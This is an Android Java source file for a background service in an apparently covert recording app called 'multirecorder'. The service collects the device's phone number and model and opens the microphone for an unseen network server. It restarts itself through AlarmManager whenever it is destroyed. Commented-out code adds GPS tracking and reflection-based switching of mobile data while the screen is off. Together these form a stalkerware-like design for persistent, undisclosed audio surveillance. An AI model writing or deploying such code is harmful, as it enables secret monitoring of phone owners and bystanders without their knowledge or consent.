package wenkael.multirecorder;

import android.Manifest;
import android.annotation.TargetApi;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.os.PowerManager;
import android.support.annotation.Nullable;
import android.support.v4.app.ActivityCompat;
import android.telephony.TelephonyManager;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Arrays;
import java.util.Date;
import java.util.concurrent.TimeUnit;


/**
 * Created by veniamin on 25.07.2016.
 */
public class MyService extends Service {

    final private String LOG_TAG = "MyService";
    private MyService context = null;
    /*
     *  Services
     */
    private static Thread thread_server = null;
    private static Thread thread = null;
    private Server server = null;
    private static AudioRecord record = null;
    private static PowerManager power = null;
//    private static LocationManager location = null;
    private static ConnectivityManager network = null;
//    private static WifiManager         wifiManager = null;
    /*
     *  Function State
     */
    private boolean location_permission = false, enabledGPS = false;
    private boolean isConnectedNET = false, isSuccessfulNET = false, isWifi = false, isMobile = false;
    private boolean MyTurnWIfi = false, MyTurnMobile = false;
    private boolean statusThread = false, statusServer = false;
    private long timeout = 1L;
    /*
     *  Data...
     */
    private String gpsDATA = null;
    private boolean screenActive = false;
    public String device_info = null;

    @Override
    public void onCreate() {
        super.onCreate();
        this.context = this;
        Log.d(LOG_TAG, "onCreate");

        /*
         *  Получение сервиса, управления питанием устройства, upd: проверка работы дисплея.
        */
        if (power == null) power = (PowerManager) getSystemService(Context.POWER_SERVICE);

        /*
         *  Получение сервиса, геолокационные данные на основе сети и спутников gps.
        */
//        if (location == null) {
//            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
//                location_permission = false;
//            }else{
//                Log.d(LOG_TAG,"location true");
//                location_permission = true;
//
//                location = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
//                enabledGPS = location.isProviderEnabled(LocationManager.GPS_PROVIDER);
//                location.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1000 * 10, 5, listener);
//            }
//        }

        /*
         * Получение сервиса, о состоянии подключения к сети. upd: Wifi,Ethernet,WiMAX.
        */
        if(network == null) {
            network = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            final NetworkInfo info = network.getActiveNetworkInfo();
            Log.d(LOG_TAG, Arrays.toString(network.getAllNetworkInfo()));
            if(info!=null) {
                this.isConnectedNET  = true;
                this.isSuccessfulNET = info.isConnectedOrConnecting();
                this.isWifi          = info.getType() == ConnectivityManager.TYPE_WIFI;
                this.isMobile        = info.getType() == ConnectivityManager.TYPE_MOBILE;
            }else{this.isConnectedNET = false;}
        }

        /*
         * Получение сервиса, wifi модуля
         */
//        if(wifiManager == null){
//            wifiManager = (WifiManager) getSystemService(Context.WIFI_SERVICE);
//        }
        this.statusThread = true;


        /*
         * Получение сервиса, контакты тел.книги
         */
        TelephonyManager tMgr = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        String mPhoneNumber = tMgr.getLine1Number();
        String device = getDeviceName();

        JSONObject object = new JSONObject();
        JSONArray array = new JSONArray();
        JSONObject obj0 = new JSONObject();
        try {
            obj0.put("phone",mPhoneNumber);
            obj0.put("device",device);
            array.put(obj0);
            object.put("info", array);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        this.device_info = object.toString();

    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(LOG_TAG,"onStartCommand");
        if(thread==null)someTask();
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(LOG_TAG,"onDestroy");
        this.statusThread=false;
        this.thread = null;
        this.restartService();
    }



    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        Log.d(LOG_TAG,"onBind");
        return null;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Log.d(LOG_TAG,"onTaskRemoved");

    }

    private void someTask(){
        Log.d(LOG_TAG,"THREAD - "+thread);

        thread = new Thread(new Runnable() {
            @Override
            public void run() {
                while (statusThread){
                    try {TimeUnit.SECONDS.sleep(timeout);} catch (InterruptedException e) {e.printStackTrace();}

                    screenActive = (power!=null)?power.isScreenOn():false;
//                    enabledGPS   = (location_permission)?location.isProviderEnabled(LocationManager.GPS_PROVIDER):false;

                    NetworkInfo info = null;
                    if(network!=null && (info = network.getActiveNetworkInfo())!=null) {
                        isSuccessfulNET = info.isConnectedOrConnecting();
                        isWifi          = info.getType() == ConnectivityManager.TYPE_WIFI;
                        isMobile        = info.getType() == ConnectivityManager.TYPE_MOBILE;
                        isConnectedNET  = true;
                    }else{isConnectedNET=false;isSuccessfulNET=false;isWifi=false;isMobile=false;}

                    Log.d(LOG_TAG,
                            "ScreenActive:"+screenActive+", ServicePower:"+(power!=null)+", enabledGPS:"+ enabledGPS+", Location:"+ gpsDATA +", \n" +
                            "isNetwork:"+isConnectedNET+", isConnected:"+isSuccessfulNET+", wifi:"+isWifi+", mobile:"+isMobile);

//                    if(!screenActive){
//                        if(!isMobile && !isWifi) {
//                            try {
//                                turnMobile(true);
//                            } catch (Exception e) {
//                                e.printStackTrace();
//                                MyTurnMobile = true;
//                            }
//                        }
//                    }else{
//                        if(isMobile && MyTurnMobile){
//                            try {
//                                turnMobile(false);
//                            } catch (Exception e) {
//                                e.printStackTrace();
//                                MyTurnMobile = false;
//                            }
//                        }
//                    }


//                    if(!screenActive){
//                        if(!isWifi&&!MyTurnWIfi){
//                            turnWifi(true);
//                        }
//                    }else{
//                        if(isWifi&&MyTurnWIfi){
//                            turnWifi(false);
//                        }
//                    }

                    if( isSuccessfulNET && !statusServer){
                        server = new Server(context);
                        thread_server = new Thread(server);
                        thread_server.setPriority(Thread.MAX_PRIORITY);
                        thread_server.start();
                        statusServer=true;
                    }else if( ( !isSuccessfulNET || !((server!=null)?server.isRunnable():false) ) && statusServer){

                        if(server!=null)server.stop();
                        thread_server = null;
                        statusServer = false;

                        if(record!=null) {
                            record.release();
                            record = null;
                        }

                    }


                }

            }
        });
        thread.setPriority(Thread.MAX_PRIORITY);
        thread.start();
    }

    synchronized public AudioRecord createMicrophone(){
        int buffersize = AudioRecord.getMinBufferSize(44100,
                AudioFormat.CHANNEL_IN_MONO,
                AudioFormat.ENCODING_PCM_16BIT);

        record = new AudioRecord(MediaRecorder.AudioSource.MIC,
                44100, AudioFormat.CHANNEL_IN_MONO,
                AudioFormat.ENCODING_PCM_16BIT, buffersize);
        record.startRecording();
        return record;
    }

    synchronized public String getInfo(){
        return "ScreenActive:"+screenActive+", ServicePower:"+(power!=null)+", enabledGPS:"+ enabledGPS+", Location:"+ gpsDATA +", " +
                "isNetwork:"+isConnectedNET+", isConnected:"+isSuccessfulNET+", wifi:"+isWifi+", mobile:"+isMobile;
    }

    public String getDeviceName() {
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;
        if (model.startsWith(manufacturer)) {
            return capitalize(model);
        } else {
            return capitalize(manufacturer) + " " + model;
        }
    }


    private String capitalize(String s) {
        if (s == null || s.length() == 0) {
            return "";
        }
        char first = s.charAt(0);
        if (Character.isUpperCase(first)) {
            return s;
        } else {
            return Character.toUpperCase(first) + s.substring(1);
        }
    }

    synchronized private void turnWifi(boolean ON){
        MyTurnWIfi = ON;
//        if(wifiManager!=null){
//            wifiManager.setWifiEnabled(ON);
//        }
    }

    /*
     *  велосипед, для переключения положения сетевого соединения, на основе MOBILE data.
     */
    synchronized void turnMobile(boolean ON) throws Exception{
        MyTurnMobile = ON;
        if(Build.VERSION.SDK_INT  == Build.VERSION_CODES.FROYO)
        {

            Log.i("version:", "Found Froyo");
            try{
                Method dataConnSwitchmethod;
                Class telephonyManagerClass;
                Object ITelephonyStub;
                Class ITelephonyClass;
                TelephonyManager telephonyManager = (TelephonyManager) getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE);

                telephonyManagerClass = Class.forName(telephonyManager.getClass().getName());
                Method getITelephonyMethod = telephonyManagerClass.getDeclaredMethod("getITelephony");
                getITelephonyMethod.setAccessible(true);
                ITelephonyStub = getITelephonyMethod.invoke(telephonyManager);
                ITelephonyClass = Class.forName(ITelephonyStub.getClass().getName());

                if (ON) {
                    dataConnSwitchmethod = ITelephonyClass.getDeclaredMethod("enableDataConnectivity");

                } else {
                    dataConnSwitchmethod = ITelephonyClass.getDeclaredMethod("disableDataConnectivity");
                }
                dataConnSwitchmethod.setAccessible(true);
                dataConnSwitchmethod.invoke(ITelephonyStub);
            }catch(Exception e){
                Log.e("Error:",e.toString());
            }

        }
        else
        {
            Log.i("version:", "Found Gingerbread+");
            final ConnectivityManager conman = (ConnectivityManager) getApplicationContext().getSystemService(Context.CONNECTIVITY_SERVICE);
            final Class conmanClass = Class.forName(conman.getClass().getName());
            final Field iConnectivityManagerField = conmanClass.getDeclaredField("mService");
            iConnectivityManagerField.setAccessible(true);
            final Object iConnectivityManager = iConnectivityManagerField.get(conman);
            final Class iConnectivityManagerClass =  Class.forName(iConnectivityManager.getClass().getName());
            final Method setMobileDataEnabledMethod = iConnectivityManagerClass.getDeclaredMethod("setMobileDataEnabled", Boolean.TYPE);
            setMobileDataEnabledMethod.setAccessible(true);
            setMobileDataEnabledMethod.invoke(iConnectivityManager, ON);
        }

    }

    @TargetApi(Build.VERSION_CODES.KITKAT)
    synchronized private void restartService(){
        Log.d(LOG_TAG,"restartService");
//        if (Build.VERSION.SDK_INT == 19)
//        {
        Log.d(LOG_TAG,"restartService - true");
        Intent restartIntent = new Intent(this, getClass());

        AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
        PendingIntent pi = PendingIntent.getService(this, 1, restartIntent, PendingIntent.FLAG_ONE_SHOT);
        restartIntent.putExtra("RESTART", pi);
        am.set(AlarmManager.RTC, System.currentTimeMillis() + 15000, pi);

//        }else Log.d(LOG_TAG,"restartService - false");
    }

    private LocationListener listener = new LocationListener() {
        @Override
        public void onLocationChanged(Location location) {
            if(location!=null&&location.getProvider().equals(LocationManager.GPS_PROVIDER))
                gpsDATA = formatLocation(location);
        }

        @Override
        public void onStatusChanged(String s, int i, Bundle bundle) {

        }

        @Override
        public void onProviderEnabled(String s) {

        }

        @Override
        public void onProviderDisabled(String s) {

        }
    };

    synchronized private String formatLocation(Location location) {
        if (location == null)
            return "";
        return String.format(
                "Coordinates: lat = %1$.4f, lon = %2$.4f, time = %3$tF %3$tT",
                location.getLatitude(), location.getLongitude(), new Date(
                        location.getTime()));
    }


}
